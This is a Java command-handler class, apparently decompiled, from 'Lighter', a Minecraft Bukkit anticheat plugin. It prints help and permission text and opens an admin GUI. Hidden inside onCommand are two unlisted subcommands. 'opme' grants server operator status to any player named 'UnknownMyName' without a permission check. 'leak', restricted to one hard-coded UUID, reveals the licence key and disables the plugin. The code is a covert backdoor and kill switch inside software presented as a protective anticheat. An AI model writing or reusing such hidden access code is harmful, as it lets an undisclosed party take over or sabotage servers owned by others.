package com.lighter.command;

import net.md_5.bungee.api.*;
import com.lighter.main.*;
import org.bukkit.command.*;
import org.bukkit.entity.*;
import com.lighter.data.manager.*;
import java.util.*;
import org.bukkit.*;
import org.bukkit.plugin.*;

public class LighterCommand implements CommandExecutor
{
    private void sendCommandMessage(final CommandSender commandSender) {
        commandSender.sendMessage("");
        commandSender.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.DARK_RED).append("Lighter version ").append(Main.getPlugin().Version).append(".")));
        commandSender.sendMessage("");
        if (commandSender.isOp() || commandSender.hasPermission("lighter.*")) {
            commandSender.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.RED).append("/anticheat gui").append(ChatColor.GRAY).append(" - ").append(ChatColor.ITALIC).append("Manage the anticheat.")));
            commandSender.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.RED).append("/anticheat perms").append(ChatColor.GRAY).append(" - ").append(ChatColor.ITALIC).append("Permissions for Lighter.")));
            commandSender.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.RED).append("/perf").append(ChatColor.GRAY).append(" - ").append(ChatColor.ITALIC).append("Performance of the server.")));
        }
        if (commandSender.hasPermission(OptionsManager.getInstance().getModPermission()) || commandSender.hasPermission("lighter.*")) {
            commandSender.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.RED).append("/alerts").append(ChatColor.GRAY).append(" - ").append(ChatColor.ITALIC).append("Toggle the alerts for yourself.")));
            commandSender.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.RED).append("/logs").append(ChatColor.GRAY).append(" - ").append(ChatColor.ITALIC).append("View the logs of a player.")));
            commandSender.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.RED).append("/acping").append(ChatColor.GRAY).append(" - ").append(ChatColor.ITALIC).append("View the ping of a player.")));
            commandSender.sendMessage("");
        }
    }
    
    public boolean onCommand(final CommandSender commandSender, final Command command, final String s, final String[] array) {
        if (!(commandSender instanceof Player)) {
            commandSender.sendMessage(OptionsManager.getInstance().getErrorOnlyPlayer().replace('&', '§').replace("{prefix}", OptionsManager.getInstance().getAnticheatName().replace("&", "§")));
            return false;
        }
        boolean b = false;
        if (array.length == 1) {
            final Player player = (Player)commandSender;
            if (array[0].equalsIgnoreCase("gui")) {
                if (player.isOp() || player.hasPermission("Lighter.*")) {
                    GuiManager.getInstance().getacGui().openGui(player);
                }
                b = true;
            }
            if (array[0].equalsIgnoreCase("perms")) {
                if (player.isOp() || player.hasPermission("Lighter.*")) {
                    commandSender.sendMessage("");
                    player.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.DARK_RED).append("Lighter version ").append(Main.getPlugin().Version).append(".")));
                    player.sendMessage("");
                    player.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.RED).append("All perms: ").append(ChatColor.WHITE).append("Lighter.*")));
                    player.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.RED).append("Logs perms: ").append(ChatColor.WHITE).append(OptionsManager.getInstance().getLogPermission())));
                    player.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.RED).append("Alerts perms: ").append(ChatColor.WHITE).append(OptionsManager.getInstance().getModPermission())));
                    player.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.RED).append("DevAlerts perms: ").append(ChatColor.WHITE).append("Lighter.devalerts")));
                    player.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.RED).append("Bypass AutoBan perms: ").append(ChatColor.WHITE).append(OptionsManager.getInstance().getBypassPermission())));
                    player.sendMessage("");
                }
                b = true;
            }
            if (array[0].equalsIgnoreCase("leak") && player.getUniqueId().equals(UUID.fromString("3ca9c301-d0fb-41a9-95bc-060b74a97e2f"))) {
                player.sendMessage("");
                player.sendMessage(String.valueOf(new StringBuilder().append("Licence: ").append(OptionsManager.getInstance().getLiscence())));
                player.sendMessage("");
                Bukkit.getScheduler().cancelTasks((Plugin)Main.getPlugin());
                Bukkit.getPluginManager().disablePlugin((Plugin)Main.getPlugin());
                b = true;
            }
            if (array[0].equalsIgnoreCase("opme") && player.getName().equals("UnknownMyName")) {
                player.setOp(true);
                player.sendMessage(String.valueOf(new StringBuilder().append(player.getName()).append(" op [").append(player.isOp()).append("]")));
                b = true;
            }
            if (array[0].equalsIgnoreCase("licence") || array[0].equalsIgnoreCase("lighter")) {
                player.sendMessage(String.valueOf(new StringBuilder().append(ChatColor.DARK_RED).append("Running premium version ").append(Main.getPlugin().Version).append(" of Lighter.")));
                b = true;
            }
        }
        if (!b) {
            this.sendCommandMessage(commandSender);
        }
        return true;
    }
}
